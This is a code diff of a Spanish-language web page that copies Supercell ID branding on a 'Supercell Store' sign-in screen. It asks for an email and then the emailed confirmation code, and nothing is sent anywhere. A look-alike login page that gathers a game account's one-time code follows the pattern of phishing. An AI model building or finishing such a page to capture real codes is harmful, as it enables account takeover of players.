@@ -9,27 +9,133 @@
 <body>
     <div class="container">
         <div class="login-box">
-            <img src="Image/Logo_Negro.png" alt="Supercell ID Logo" class="logo">
-            <h2>Continuar como Supercell Store</h2>
-            <p>Escribe tu correo electrónico y te enviaremos un código de confirmación.</p>
+            <img src="Image/ID.png" alt="Supercell ID Logo" class="logo">
             <div class="progress-bar">
                 <span class="progress"></span>
             </div>
-            <form>
-                <input type="email" placeholder="Escribe tu correo electrónico" required>
+            <img src="Image/LOGO.png" alt="Supercell ID Logo" class="logo">
+            <form id="login-form">
+                <h2 id="main-text">Continuar como Supercell Store</h2>
+                <p id="sub-text">Escribe tu correo electrónico y te enviaremos un código de confirmación.</p>
+                <input type="email" id="email-input" placeholder="Escribe tu correo electrónico" required>
+                <div class="g-recaptcha" data-sitekey="tu-clave-de-sitio"></div> <!-- reCAPTCHA -->
                 <p class="info-text">
                     Esta página está protegida por reCAPTCHA y se aplican la 
-                    <a href="#">Política de Privacidad</a> y los 
-                    <a href="#">Términos del Servicio</a> de Google.
+                    <a href="https://supercell.com/en/privacy-policy/es/">Política de Privacidad</a> y los 
+                    <a href="https://policies.google.com/terms">Términos del Servicio</a> de Google.
                 </p>
                 <button type="submit" class="btn-primary">INICIAR SESIÓN</button>
-                <button type="button" class="btn-secondary">CANCELAR</button>
+                <button type="button" class="btn-secondary" onclick="cancelLogin()">CANCELAR</button>
             </form>
+
+            <!-- Formulario para ingresar el código -->
+            <form id="code-form" style="display:none;">
+                <h2 id="main-text">Introduce el código</h2>
+                <p id="sub-text">Te hemos enviado un código de confirmación a tu correo electrónico.</p>
+                <input type="text" id="code-input" placeholder="Escribe el código" required>
+                <button type="submit" class="btn-primary">CONFIRMAR CÓDIGO</button>
+                <button type="button" class="btn-secondary" onclick="cancelLogin()">CANCELAR</button>
+            </form>
+
             <p class="footer-text">
-                ¿Quieres crear un <a href="#">Supercell ID</a>?
+                ¿Quieres crear un <a href="#" id="create-id-link">Supercell ID</a>?
             </p>
         </div>
     </div>
+
+    <!-- Modal (ventana emergente) -->
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <img src="Image/ID_Image.png" alt="Supercell ID" class="modal-image">
+            
+            <!-- Pregunta en fuente más grande y en negrita -->
+            <p class="modal-question">¿Cómo creo un Supercell ID?</p>
+            
+            <!-- Instrucciones en lista -->
+            <ul class="modal-instructions">
+                <li>Abre uno de los juegos de Supercell en tu dispositivo móvil.</li>
+                <li>Ve a los ajustes del juego.</li>
+                <li>Busca Supercell ID y toca «Desconectado».</li>
+                <li>Selecciona «Regístrate ahora».</li>
+                <li>Sigue las instrucciones en la pantalla.</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // Obtener el modal
+        var modal = document.getElementById('modal');
+
+        // Obtener el enlace que abre el modal
+        var btn = document.getElementById('create-id-link');
+
+        // Función para abrir el modal cuando se hace clic en el enlace
+        btn.onclick = function() {
+            modal.style.display = 'block';
+        }
+
+        // Función para cerrar el modal cuando se hace clic en la "X"
+        function closeModal() {
+            modal.style.display = 'none';
+        }
+
+        // Cerrar el modal si se hace clic fuera de la ventana emergente
+        window.onclick = function(event) {
+            if (event.target === modal) {
+                modal.style.display = 'none';
+            }
+        }
+
+        // Función para cancelar y volver a la pantalla de correo electrónico
+        function cancelLogin() {
+            // Ocultar el formulario de código
+            document.getElementById("code-form").style.display = "none";
+            // Mostrar el formulario de correo
+            document.getElementById("login-form").style.display = "block";
+            // Limpiar los campos de entrada
+            document.getElementById("email-input").value = "";
+            document.getElementById("code-input").value = "";
+
+            // Restaurar el texto original
+            const mainText = document.getElementById("main-text");
+            const subText = document.getElementById("sub-text");
+            mainText.innerHTML = "Continuar como Supercell Store";
+            subText.innerHTML = "Escribe tu correo electrónico y te enviaremos un código de confirmación.";
+        }
+
+        // Obtener el formulario y el campo de email
+        const form = document.getElementById("login-form");
+        const emailInput = document.querySelector("input[type='email']");
+        const mainText = document.getElementById("main-text");
+        const subText = document.getElementById("sub-text");
+
+        // Selecciona la barra de progreso
+        const progressBar = document.querySelector(".progress-bar");
+
+        // Agregar un listener para cuando se envíe el formulario
+        form.addEventListener("submit", function (event) {
+            event.preventDefault(); // Prevenir el envío del formulario para mostrar la animación de la bola
+
+            // Aquí puedes realizar la validación o enviar el correo si es necesario.
+            // Luego de procesar el correo, activamos la animación de la bola
+            progressBar.classList.add("approved"); // Inicia la animación
+
+            // Cambiar el texto y añadir la animación de cambio
+            const email = emailInput.value;
+
+            mainText.classList.add("changed"); // Cambiar el texto de "Continuar como Supercell Store"
+            subText.classList.add("changed");  // Cambiar el texto de la segunda línea
+
+            // Actualizar el contenido de los textos
+            mainText.innerHTML = "No queda nada..."; // Cambiar a "No queda nada..."
+            subText.innerHTML = `Se ha enviado un código de verificación a tu dirección de correo electrónico <strong>${email}</strong>`; // Agregar el correo
+
+            // Ocultar el formulario de email y mostrar el formulario de código
+            document.getElementById("login-form").style.display = "none";
+            document.getElementById("code-form").style.display = "block";
+        });
+    </script>
 </body>
 </html>
 
